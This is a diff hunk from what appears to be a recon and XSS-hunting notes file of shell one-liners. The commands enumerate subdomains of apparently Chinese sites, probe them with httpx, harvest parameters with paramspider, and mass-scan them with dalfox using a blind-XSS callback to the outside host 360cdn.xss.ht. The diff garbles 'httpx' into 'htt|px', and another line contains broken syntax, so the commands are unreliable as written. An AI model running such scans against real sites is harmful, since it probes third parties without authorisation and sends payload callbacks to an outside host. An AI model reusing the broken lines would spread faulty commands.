@@ -155,7 +155,7 @@ cat output/baidu.txt | deduplicate --hide-images --sort | sed '1,4d'|httpx -stat
 
 cat src.txt| xargs -I {} python3 paramspider.py --domain {}  -s TRUE -e js,css,woff,ttf,svg,png,gif,jpg,PNG --output ./src/{}.txt
 
-cat all_jd_sub_domain.txt|deduplicate|httpx -status-code -mc 200,301 -silent| awk '{print $1}' > 200_sub_jd.txt
+cat all_jd_sub_domain.txt|deduplicate|htt|px -status-code -mc 200,301 -silent| awk '{print $1}' > 200_sub_jd.txt
 
 cat src.txt| xargs -I {} | &&  cat ./src/*.txt | deduplicate --hide-images --sort | sed '1,4d'|httpx -status-code -mc 200 -silent | awk '{print $1}' >  src_url.txt && python3 removeDepeat.py && cat remove_src_url.txt | dalfox pipe --mass-worker 50 -b 360cdn.xss.ht  -o final_xss.txt
 ```
